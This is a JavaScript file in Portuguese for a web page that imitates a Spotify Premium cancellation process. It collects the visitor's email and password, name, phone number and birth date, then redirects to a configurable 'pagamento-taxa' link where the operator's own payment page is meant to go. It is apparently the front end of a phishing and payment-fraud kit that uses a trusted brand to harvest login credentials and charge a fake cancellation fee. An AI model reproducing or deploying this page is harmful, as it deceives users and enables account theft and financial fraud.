// Estado global da aplicação
let currentStep = 1;
let selectedPlan = null;
let formData = {
    email: '',
    password: '',
    plan: '',
    reason: '',
    fullName: '',
    phone: '',
    birthDate: ''
};

// URL para redirecionamento do pagamento - ALTERE AQUI PARA SEU LINK ESPECÍFICO
const PAYMENT_REDIRECT_URL = 'https://seulink.com/pagamento-taxa';

// Inicialização quando o DOM estiver carregado
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

// Função de inicialização
function initializeApp() {
    setupEventListeners();
    setupPlanSelection();
    updateProgressBar();
    showStep(1);
}

// Configurar event listeners
function setupEventListeners() {
    // Form de login
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLoginSubmit);
    }

    // Form de motivo
    const reasonForm = document.getElementById('reason-form');
    if (reasonForm) {
        reasonForm.addEventListener('submit', handleReasonSubmit);
    }

    // Form de confirmação
    const confirmationForm = document.getElementById('confirmation-form');
    if (confirmationForm) {
        confirmationForm.addEventListener('submit', handleConfirmationSubmit);
    }

    // Formatação automática de campos
    setupInputFormatting();
}

// Configurar seleção de planos
function setupPlanSelection() {
    const planElements = document.querySelectorAll('.subscription-plan');
    const continueBtn = document.getElementById('continue-btn');
    
    planElements.forEach(plan => {
        plan.addEventListener('click', function() {
            // Remove seleção anterior
            planElements.forEach(p => p.classList.remove('selected'));
            
            // Adiciona seleção ao plano clicado
            this.classList.add('selected');
            
            // Armazena o plano selecionado
            selectedPlan = this.getAttribute('data-plan');
            formData.plan = selectedPlan;
            
            // Habilita o botão continuar
            if (continueBtn) {
                continueBtn.disabled = false;
            }
            
            // Adiciona feedback visual
            this.style.transform = 'scale(1.02)';
            setTimeout(() => {
                this.style.transform = '';
            }, 200);
        });
        
        // Adiciona efeito hover melhorado
        plan.addEventListener('mouseenter', function() {
            if (!this.classList.contains('selected')) {
                this.style.transform = 'translateY(-4px)';
            }
        });
        
        plan.addEventListener('mouseleave', function() {
            if (!this.classList.contains('selected')) {
                this.style.transform = '';
            }
        });
    });
}

// Configurar formatação automática de inputs
function setupInputFormatting() {
    // Formatação do telefone
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 11) {
                if (value.length <= 2) {
                    value = value.replace(/(\d{0,2})/, '($1');
                } else if (value.length <= 7) {
                    value = value.replace(/(\d{2})(\d{0,5})/, '($1) $2');
                } else {
                    value = value.replace(/(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
                }
            }
            e.target.value = value;
        });
    }
}

// Manipular submit do form de login
function handleLoginSubmit(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Validação básica
    if (!email || !password) {
        showError('Por favor, preencha todos os campos.');
        return;
    }

    if (!isValidEmail(email)) {
        showError('Por favor, insira um email válido.');
        return;
    }

    // Salvar dados
    formData.email = email;
    formData.password = password;

    // Simular loading
    const submitBtn = e.target.querySelector('button[type="submit"]');
    showLoading(submitBtn, true);

    setTimeout(() => {
        showLoading(submitBtn, false);
        nextStep();
    }, 1500);
}

// Manipular submit do form de motivo
function handleReasonSubmit(e) {
    e.preventDefault();
    
    const selectedReason = document.querySelector('input[name="reason"]:checked');
    
    if (!selectedReason) {
        showError('Por favor, selecione um motivo.');
        return;
    }

    formData.reason = selectedReason.value;
    nextStep();
}

// Manipular submit do form de confirmação
function handleConfirmationSubmit(e) {
    e.preventDefault();
    
    const fullName = document.getElementById('full-name').value;
    const phone = document.getElementById('phone').value;
    const birthDate = document.getElementById('birth-date').value;
    const termsAgreement = document.getElementById('terms-agreement').checked;

    // Validações
    if (!fullName || !phone || !birthDate) {
        showError('Por favor, preencha todos os campos obrigatórios.');
        return;
    }

    if (!termsAgreement) {
        showError('Você deve concordar com os termos de cancelamento.');
        return;
    }

    if (fullName.trim().split(' ').length < 2) {
        showError('Por favor, insira seu nome completo.');
        return;
    }

    if (phone.replace(/\D/g, '').length < 10) {
        showError('Por favor, insira um telefone válido.');
        return;
    }

    if (!isValidBirthDate(birthDate)) {
        showError('Por favor, insira uma data de nascimento válida.');
        return;
    }

    // Salvar dados
    formData.fullName = fullName;
    formData.phone = phone;
    formData.birthDate = birthDate;

    // Simular processamento e redirecionar para pagamento
    const submitBtn = e.target.querySelector('button[type="submit"]');
    showLoading(submitBtn, true);

    setTimeout(() => {
        showLoading(submitBtn, false);
        
        // Redirecionar para o link de pagamento
        showSuccess('Redirecionando para o pagamento...');
        
        setTimeout(() => {
            window.location.href = PAYMENT_REDIRECT_URL;
        }, 2000);
    }, 2000);
}

// Função para avançar para próxima etapa
function nextStep() {
    // Validação específica para o step 2 (seleção de plano)
    if (currentStep === 2 && !selectedPlan) {
        showError('Por favor, selecione um plano antes de continuar.');
        return;
    }
    
    if (currentStep < 5) {
        currentStep++;
        showStep(currentStep);
        updateProgressBar();
        
        // Feedback de sucesso ao selecionar plano
        if (currentStep === 3 && selectedPlan) {
            const planNames = {
                'individual': 'Premium Individual',
                'student': 'Premium Universitário',
                'duo': 'Premium Duo',
                'family': 'Premium Família'
            };
            showSuccess(`Plano ${planNames[selectedPlan]} selecionado com sucesso!`);
        }
    }
}

// Função para voltar para etapa anterior
function previousStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
        updateProgressBar();
    }
}

// Mostrar etapa específica
function showStep(stepNumber) {
    // Esconder todas as etapas
    const allSteps = document.querySelectorAll('.step');
    allSteps.forEach(step => {
        step.classList.remove('active');
    });

    // Mostrar etapa atual
    const currentStepElement = document.getElementById(`step-${stepNumber}`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }

    // Scroll para o topo
    window.scrollTo({ top: 0, behavior: 'smooth' });
    
    // Reconfigurar listeners se necessário
    if (stepNumber === 2) {
        setupPlanSelection();
    }
}

// Atualizar barra de progresso
function updateProgressBar() {
    const progressFill = document.getElementById('progress-fill');
    const currentStepSpan = document.getElementById('current-step');
    const progressPercentSpan = document.getElementById('progress-percent');

    if (progressFill && currentStepSpan && progressPercentSpan) {
        const percentage = (currentStep / 5) * 100;
        
        progressFill.style.width = `${percentage}%`;
        currentStepSpan.textContent = currentStep;
        progressPercentSpan.textContent = Math.round(percentage);
    }
}

// Validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Validar data de nascimento
function isValidBirthDate(date) {
    const birthDate = new Date(date);
    const currentDate = new Date();
    const age = currentDate.getFullYear() - birthDate.getFullYear();
    
    // Verificar se a pessoa tem pelo menos 13 anos
    if (age < 13) return false;
    
    // Verificar se a data não é no futuro
    if (birthDate > currentDate) return false;
    
    return true;
}

// Mostrar estado de loading no botão
function showLoading(button, isLoading) {
    if (isLoading) {
        button.classList.add('loading');
        button.disabled = true;
    } else {
        button.classList.remove('loading');
        button.disabled = false;
    }
}

// Mostrar mensagem de erro
function showError(message) {
    // Remover erro anterior se existir
    const existingError = document.querySelector('.error-message');
    if (existingError) {
        existingError.remove();
    }

    // Criar elemento de erro
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.cssText = `
        background-color: rgba(220, 38, 38, 0.1);
        border: 1px solid rgba(220, 38, 38, 0.3);
        color: #fca5a5;
        padding: 12px 16px;
        border-radius: 8px;
        margin-bottom: 16px;
        font-size: 14px;
        animation: fadeIn 0.3s ease-out;
    `;
    errorDiv.textContent = message;

    // Inserir antes do primeiro botão do step atual
    const currentStepElement = document.getElementById(`step-${currentStep}`);
    const firstButton = currentStepElement.querySelector('.btn');
    if (firstButton) {
        firstButton.parentNode.insertBefore(errorDiv, firstButton);
    }

    // Remover erro após 5 segundos
    setTimeout(() => {
        if (errorDiv.parentNode) {
            errorDiv.remove();
        }
    }, 5000);
}

// Mostrar mensagem de sucesso
function showSuccess(message) {
    // Remover sucesso anterior se existir
    const existingSuccess = document.querySelector('.success-message');
    if (existingSuccess) {
        existingSuccess.remove();
    }

    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.style.cssText = `
        background-color: rgba(34, 197, 94, 0.1);
        border: 1px solid rgba(34, 197, 94, 0.3);
        color: #86efac;
        padding: 12px 16px;
        border-radius: 8px;
        margin-bottom: 16px;
        font-size: 14px;
        animation: fadeIn 0.3s ease-out;
    `;
    successDiv.textContent = message;

    const currentStepElement = document.getElementById(`step-${currentStep}`);
    const cardContent = currentStepElement.querySelector('.card-content');
    if (cardContent) {
        cardContent.insertBefore(successDiv, cardContent.firstChild);
    }

    setTimeout(() => {
        if (successDiv.parentNode) {
            successDiv.remove();
        }
    }, 3000);
}

// Função para obter informações do plano selecionado
function getSelectedPlanInfo() {
    const planInfo = {
        'individual': {
            name: 'Spotify Premium Individual',
            price: 'R$ 21,90/mês',
            features: [
                'Música sem anúncios',
                'Download para ouvir offline',
                'Reprodução em qualquer ordem',
                'Qualidade de áudio superior',
                '1 conta Premium'
            ]
        },
        'student': {
            name: 'Spotify Premium Universitário',
            price: 'R$ 11,90/mês',
            features: [
                'Música sem anúncios',
                'Download para ouvir offline',
                'Reprodução em qualquer ordem',
                'Qualidade de áudio superior',
                'Desconto para estudantes verificados'
            ]
        },
        'duo': {
            name: 'Spotify Premium Duo',
            price: 'R$ 27,90/mês',
            features: [
                'Música sem anúncios',
                'Download para ouvir offline',
                'Reprodução em qualquer ordem',
                'Qualidade de áudio superior',
                '2 contas Premium para casais'
            ]
        },
        'family': {
            name: 'Spotify Premium Família',
            price: 'R$ 34,90/mês',
            features: [
                'Música sem anúncios',
                'Download para ouvir offline',
                'Reprodução em qualquer ordem',
                'Qualidade de áudio superior',
                'Até 6 contas Premium ou Kids',
                'Controle de conteúdo explícito',
                'Acesso ao Spotify Kids'
            ]
        }
    };
    
    return selectedPlan ? planInfo[selectedPlan] : null;
}

// Função para debug (pode ser removida em produção)
function debugFormData() {
    console.log('Form Data:', formData);
    console.log('Current Step:', currentStep);
    console.log('Selected Plan:', selectedPlan);
    console.log('Selected Plan Info:', getSelectedPlanInfo());
}

// Adicionar alguns event listeners globais para melhor UX
document.addEventListener('keydown', function(e) {
    // Permitir navegação com Enter em campos de input
    if (e.key === 'Enter') {
        const activeElement = document.activeElement;
        if (activeElement && activeElement.tagName === 'INPUT') {
            const form = activeElement.closest('form');
            if (form) {
                const submitBtn = form.querySelector('button[type="submit"]');
                if (submitBtn && !submitBtn.disabled) {
                    submitBtn.click();
                }
            }
        }
    }
    
    // Navegação com setas nos planos (step 2)
    if (currentStep === 2 && (e.key === 'ArrowUp' || e.key === 'ArrowDown')) {
        e.preventDefault();
        const plans = document.querySelectorAll('.subscription-plan');
        const currentSelected = document.querySelector('.subscription-plan.selected');
        let currentIndex = currentSelected ? Array.from(plans).indexOf(currentSelected) : -1;
        
        if (e.key === 'ArrowDown') {
            currentIndex = (currentIndex + 1) % plans.length;
        } else {
            currentIndex = currentIndex <= 0 ? plans.length - 1 : currentIndex - 1;
        }
        
        plans[currentIndex].click();
    }
});

// Prevenir envio de formulário com Enter em campos específicos
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && e.target.type === 'radio') {
        e.preventDefault();
        const form = e.target.closest('form');
        if (form) {
            const submitBtn = form.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.click();
            }
        }
    }
});

// Função para resetar o formulário (útil para testes)
function resetForm() {
    currentStep = 1;
    selectedPlan = null;
    formData = {
        email: '',
        password: '',
        plan: '',
        reason: '',
        fullName: '',
        phone: '',
        birthDate: ''
    };
    
    // Limpar todos os inputs
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        if (input.type === 'radio' || input.type === 'checkbox') {
            input.checked = false;
        } else {
            input.value = '';
        }
    });
    
    // Remover seleção dos planos
    const plans = document.querySelectorAll('.subscription-plan');
    plans.forEach(plan => plan.classList.remove('selected'));
    
    // Resetar interface
    showStep(1);
    updateProgressBar();
    
    // Desabilitar botão continuar
    const continueBtn = document.getElementById('continue-btn');
    if (continueBtn) {
        continueBtn.disabled = true;
    }
}

// Função para alterar o URL de redirecionamento (útil para configuração)
function setPaymentRedirectUrl(newUrl) {
    PAYMENT_REDIRECT_URL = newUrl;
    console.log('URL de redirecionamento atualizada para:', newUrl);
}

